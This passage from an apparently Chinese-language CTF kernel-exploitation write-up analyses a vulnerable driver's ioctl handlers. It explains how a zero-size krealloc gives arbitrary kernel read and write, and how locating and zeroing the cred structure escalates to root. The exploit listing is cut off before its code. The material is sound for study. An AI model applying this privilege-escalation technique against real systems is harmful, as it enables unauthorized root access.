freed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">krealloc</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *p, <span class="keyword">size_t</span> new_size, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!new_size)) &#123;</span><br><span class="line">kfree(p);</span><br><span class="line"><span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = __do_krealloc(p, new_size, flags);</span><br><span class="line"><span class="keyword">if</span> (ret &amp;&amp; p != ret)</span><br><span class="line">kfree(p);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(krealloc);</span><br><span class="line"></span><br><span class="line">include\linux\slab.h:</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ZERO_SIZE_PTR ((void *)16)</span></span><br></pre></td></tr></table></figure><p>所以我们可以构造new_size为0即可返回0x10，并且我们构造为0是让记录size的位置为-1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x77617368</span>u:</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(&amp;write_channel, v3, <span class="number">24LL</span>) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">    p_lock = &amp;private_data-&gt;lock;</span><br><span class="line">    mutex_lock(&amp;private_data-&gt;lock);</span><br><span class="line">    v14 = private_data-&gt;channel;</span><br><span class="line">    count = write_channel.count;</span><br><span class="line">    <span class="keyword">if</span> ( !private_data-&gt;channel )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_40;</span><br><span class="line">    index = v14-&gt;index;</span><br><span class="line">    <span class="keyword">if</span> ( write_channel.count + index &gt; v14-&gt;buf_size</span><br><span class="line">        || copy_to_user(write_channel.buf, &amp;v14-&gt;data[index], LODWORD(write_channel.count)) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x77617369</span>u:</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(&amp;write_channel, v3, <span class="number">24LL</span>) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">    p_lock = &amp;private_data-&gt;lock;</span><br><span class="line">    mutex_lock(&amp;private_data-&gt;lock);</span><br><span class="line">    v16 = private_data-&gt;channel;</span><br><span class="line">    count = write_channel.count;</span><br><span class="line">    <span class="keyword">if</span> ( !private_data-&gt;channel )</span><br><span class="line">    &#123;</span><br><span class="line">        LABEL_40:</span><br><span class="line">        count = <span class="number">-6LL</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    &#125;</span><br><span class="line">    v17 = v16-&gt;index;</span><br><span class="line">    <span class="keyword">if</span> ( write_channel.count + v17 &gt; v16-&gt;buf_size</span><br><span class="line">        || strncpy_from_user(&amp;v16-&gt;data[v17], write_channel.buf, write_channel.count) &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x7761736A</span>u:</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(&amp;write_channel, v3, <span class="number">24LL</span>) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">    p_lock = &amp;private_data-&gt;lock;</span><br><span class="line">    count = <span class="number">-6LL</span>;</span><br><span class="line">    mutex_lock(&amp;private_data-&gt;lock);</span><br><span class="line">    v8 = private_data-&gt;channel;</span><br><span class="line">    <span class="keyword">if</span> ( !private_data-&gt;channel )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    <span class="keyword">if</span> ( LODWORD(write_channel.count) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( LODWORD(write_channel.count) == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            count = v8-&gt;index;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">    &#125;</span><br><span class="line">    count = (__int64)write_channel.buf;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">char</span> *)v8-&gt;buf_size &lt;= write_channel.buf )</span><br><span class="line">    &#123;</span><br><span class="line">        LABEL_31:</span><br><span class="line">        count = <span class="number">-22LL</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    &#125;</span><br><span class="line">    v8-&gt;index = (<span class="keyword">loff_t</span>)write_channel.buf;</span><br><span class="line">    LABEL_9:</span><br><span class="line">    mutex_unlock(p_lock);</span><br><span class="line">    <span class="keyword">return</span> count;</span><br></pre></td></tr></table></figure><p>下面则是根据修改index，然后根据index读取或者写入内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000652 48 8B 5D C8                   mov     rbx, [rbp-38h]</span><br><span class="line">.text:0000000000000656 48 39 58 10                   cmp     [rax+10h], rbx</span><br><span class="line">.text:000000000000065A 76 85                         jbe     short loc_5E1</span><br></pre></td></tr></table></figure><p>并且可以看到下面是无符号比较，所以我们刚刚写入的-1就会变成最大的值，也就造成了任意地址读写了。</p><h2 id="修改cred结构提升权限"><a href="#修改cred结构提升权限" class="headerlink" title="修改cred结构提升权限"></a>修改cred结构提升权限</h2><p>cred结构体应该不会很陌生，所以我们的思路就是修改cred结构体中记录进程权限的值即可</p><p>首先，每一个线程在内核中都对应一个线程栈、一个线程结构块thread_info去调度，结构体里面同时也包含了线程的一系列信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>*<span class="title">task</span>;</span><span class="comment">/* main task structure */</span></span><br><span class="line">__u32flags;<span class="comment">/* low level flags */</span></span><br><span class="line">__u32status;<span class="comment">/* thread synchronous flags */</span></span><br><span class="line">__u32cpu;<span class="comment">/* current CPU */</span></span><br><span class="line"><span class="keyword">mm_segment_t</span>addr_limit;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>sig_on_uaccess_error:<span class="number">1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>uaccess_err:<span class="number">1</span>;<span class="comment">/* uaccess failed */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>thread_info结构体存放在线程栈中最低的地址，并且包含一个重要信息task_struct</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="keyword">long</span> state;<span class="comment">/* -1 unrunnable, 0 runnable, &gt;0 stopped */</span></span><br><span class="line"><span class="keyword">void</span> *<span class="built_in">stack</span>;</span><br><span class="line"><span class="keyword">atomic_t</span> usage;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> flags;<span class="comment">/* per process flags, defined below */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> ptrace;</span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line"><span class="comment">/* process credentials */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">ptracer_cred</span>;</span> <span class="comment">/* Tracer&#x27;s credentials at attach */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">real_cred</span>;</span> <span class="comment">/* objective and real subjective task</span></span><br><span class="line"><span class="comment"> * credentials (COW) */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">cred</span>;</span><span class="comment">/* effective (overridable) subjective task</span></span><br><span class="line"><span class="comment"> * credentials (COW) */</span></span><br><span class="line"><span class="keyword">char</span> comm[TASK_COMM_LEN]; <span class="comment">/* executable name excluding path</span></span><br><span class="line"><span class="comment">     - access with [gs]et_task_comm (which lock</span></span><br><span class="line"><span class="comment">       it with task_lock())</span></span><br><span class="line"><span class="comment">     - initialized normally by setup_new_exec */</span></span><br><span class="line"><span class="comment">/* file system info */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nameidata</span> *<span class="title">nameidata</span>;</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSVIPC</span></span><br><span class="line">    <span class="comment">/* ipc stuff */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sysv_sem</span> <span class="title">sysvsem</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sysv_shm</span> <span class="title">sysvshm</span>;</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    ... ... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到其中存放着cred结构体，这里就不再提cred结构体了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct cred *<span class="title">prepare_creds</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> =</span> current;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">validate_process_creds();</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">kdebug(<span class="string">&quot;prepare_creds() alloc %p&quot;</span>, <span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line">old = task-&gt;cred;</span><br><span class="line"><span class="built_in">memcpy</span>(<span class="keyword">new</span>, old, <span class="keyword">sizeof</span>(struct cred));</span><br><span class="line"></span><br><span class="line">atomic_set(&amp;<span class="keyword">new</span>-&gt;usage, <span class="number">1</span>);</span><br><span class="line">set_cred_subscribers(<span class="keyword">new</span>, <span class="number">0</span>);</span><br><span class="line">get_group_info(<span class="keyword">new</span>-&gt;group_info);</span><br><span class="line">get_uid(<span class="keyword">new</span>-&gt;user);</span><br><span class="line">get_user_ns(<span class="keyword">new</span>-&gt;user_ns);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;session_keyring);</span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;process_keyring);</span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;thread_keyring);</span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;request_key_auth);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">new</span>-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (security_prepare_creds(<span class="keyword">new</span>, old, GFP_KERNEL) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line">validate_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span>;</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">abort_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(prepare_creds);</span><br></pre></td></tr></table></figure><p>可以看到cred结构体是通过kmem_cache_alloc创建的</p><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>利用内存任意读找到cred结构体，再利用内存任意写，将用于表示权限的数据位写为0，就可以完成提权</p><p>如何找到这个结构体?在task_struct里有一个<code> char comm[TASK_COMM_LEN];</code> 字符数组，这个字符串表示线程的名字，其内容可以通过linux的<code>prctl(PR_SET_NAME,target);</code>来设置指定的值。那么，我们设置一个复杂的长度不超过16字节的字符串作为标记，然后，在内存里搜索这个标记，如果搜索到了，就可以确定这个位置前面就是cred指针</p><p>linux kernel内存映射图：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffffffffffffff</span>  ---+-----------+-----------------------------------------------+-------------+</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">    <span class="number">8</span>M                 |           | unused hole                                   |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line"><span class="number">0xffffffffff7ff000</span>  ---|-----------+------------| FIXADDR_TOP |--------------------|+++++++++++++|</span><br><span class="line">    <span class="number">1</span>M                 |           |                                               |+++++++++++++|</span><br><span class="line"><span class="number">0xffffffffff600000</span>  ---+-----------+------------| VSYSCALL_ADDR |------------------|+++++++++++++|</span><br><span class="line">    <span class="number">548</span>K               |           | vsyscalls                                     |+++++++++++++|</span><br><span class="line"><span class="number">0xffffffffff577000</span>  ---+-----------+------------| FIXADDR_START |------------------|+++++++++++++|</span><br><span class="line">    <span class="number">5</span>M                 |           | hole                                          |+++++++++++++|</span><br><span class="line"><span class="number">0xffffffffff000000</span>  ---+-----------+------------| MODULES_END |--------------------|+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">    <span class="number">1520</span>M              |           | <span class="function"><span class="keyword">module</span> mapping <span class="title">space</span> <span class="params">(MODULES_LEN)</span>            |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">0xffffffffa0000000  ---+-----------+------------| MODULES_VADDR |------------------|+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">    512M               |           | kernel text mapping, from phys 0              |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">0xffffffff80000000  ---+-----------+------------| __START_KERNEL_map |-------------|+++++++++++++|</span></span><br><span class="line"><span class="function">    2G                 |           | hole                                          |+++++++++++++|</span></span><br><span class="line"><span class="function">0xffffffff00000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span></span><br><span class="line"><span class="function">    64G                |           | EFI region mapping space                      |+++++++++++++|</span></span><br><span class="line"><span class="function">0xffffffef00000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span></span><br><span class="line"><span class="function">    444G               |           | hole                                          |+++++++++++++|</span></span><br><span class="line"><span class="function">0xffffff8000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span></span><br><span class="line"><span class="function">    16T                |           | %esp fixup stacks                             |+++++++++++++|</span></span><br><span class="line"><span class="function">0xffffff0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span></span><br><span class="line"><span class="function">    3T                 |           | hole                                          |+++++++++++++|</span></span><br><span class="line"><span class="function">0xfffffc0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span></span><br><span class="line"><span class="function">    16T                |           | kasan shadow <span class="title">memory</span> <span class="params">(<span class="number">16</span>TB)</span>                    |+++++++++++++|</span></span><br><span class="line"><span class="function">0xffffec0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span></span><br><span class="line"><span class="function">    1T                 |           | hole                                          |+++++++++++++|</span></span><br><span class="line"><span class="function">0xffffeb0000000000  ---+-----------+-----------------------------------------------| kernel space|</span></span><br><span class="line"><span class="function">    1T                 |           | <span class="keyword">virtual</span> memory <span class="built_in">map</span> <span class="keyword">for</span> all of struct pages    |+++++++++++++|</span></span><br><span class="line"><span class="function">0xffffea0000000000  ---+-----------+------------| VMEMMAP_START |------------------|+++++++++++++|</span></span><br><span class="line"><span class="function">    1T                 |           | hole                                          |+++++++++++++|</span></span><br><span class="line"><span class="function">0xffffe90000000000  ---+-----------+------------| VMALLOC_END   |------------------|+++++++++++++|</span></span><br><span class="line"><span class="function">    32T                |           | vmalloc/<span class="title">ioremap</span> <span class="params">(<span class="number">1</span> &lt;&lt; VMALLOC_SIZE_TB)</span>        |+++++++++++++|</span></span><br><span class="line"><span class="function">0xffffc90000000000  ---+-----------+------------| VMALLOC_START |------------------|+++++++++++++|</span></span><br><span class="line"><span class="function">    1T                 |           | hole                                          |+++++++++++++|</span></span><br><span class="line"><span class="function">0xffffc80000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">    64T                |           | direct mapping of all phys. memory            |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           | <span class="params">(<span class="number">1</span> &lt;&lt; MAX_PHYSMEM_BITS)</span>                       |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">0xffff880000000000 ----+-----------+-----------| __PAGE_OFFSET_BASE | -------------|+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">    8T                 |           | guard hole, reserved <span class="keyword">for</span> hypervisor           |+++++++++++++|</span></span><br><span class="line"><span class="function">                       |           |                                               |+++++++++++++|</span></span><br><span class="line"><span class="function">0xffff800000000000 ----+-----------+-----------------------------------------------+-------------+</span></span><br><span class="line"><span class="function">                       |-----------|                                               |-------------|</span></span><br><span class="line"><span class="function">                       |-----------| hole caused by [48:63] sign extension         |-------------|</span></span><br><span class="line"><span class="function">                       |-----------|                                               |-------------|</span></span><br><span class="line"><span class="function">0x0000800000000000 ----+-----------+-----------------------------------------------+-------------+</span></span><br><span class="line"><span class="function">    PAGE_SIZE          |           | guard page                                    |xxxxxxxxxxxxx|</span></span><br><span class="line"><span class="function">0x00007ffffffff000 ----+-----------+--------------| TASK_SIZE_MAX | ---------------|xxxxxxxxxxxxx|</span></span><br><span class="line"><span class="function">                       |           |                                               |  user space |</span></span><br><span class="line"><span class="function">                       |           |                                               |xxxxxxxxxxxxx|</span></span><br><span class="line"><span class="function">                       |           |                                               |xxxxxxxxxxxxx|</span></span><br><span class="line"><span class="function">                       |           |                                               |xxxxxxxxxxxxx|</span></span><br><span class="line"><span class="function">    128T               |           | different per mm                              |xxxxxxxxxxxxx|</span></span><br><span class="line"><span class="function">                       |           |                                               |xxxxxxxxxxxxx|</span></span><br><span class="line"><span class="function">                       |           |                                               |xxxxxxxxxxxxx|</span></span><br><span class="line"><span class="function">                       |           |                                               |xxxxxxxxxxxxx|</span></span><br><span class="line"><span class="function">0x0000000000000000 ----+-----------+-----------------------------------------------+-------------+</span></span><br></pre></td></tr></table></figure><p>在0xffff880000000000——0xffffc80000000000区域，是堆的分配区域，因此，我们只需要搜索这段内存，即可找到task_struct结构，进而找到cred结构。</p><p>综上，exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span 